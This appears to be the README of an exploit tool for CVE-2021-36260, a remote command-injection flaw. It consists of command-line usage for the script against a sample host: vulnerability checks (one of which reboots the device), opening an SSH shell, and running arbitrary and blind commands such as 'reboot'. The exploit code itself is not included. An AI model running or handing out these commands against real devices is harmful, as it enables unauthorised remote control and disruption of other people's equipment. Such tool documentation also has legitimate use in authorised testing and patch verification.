# CVE-2021-36260
CVE-2021-36260
./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check

Safe and unsafe vulnerability/verify check:
(will only use 'unsafe check' if not verified with 'safe check')
 $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot

Unsafe vulnerability/verify check:
$./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot

Launch and connect to SSH shell:
$./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell

Execute command:
$./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd "ls -l"

Execute blind command:
$./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind "reboot"
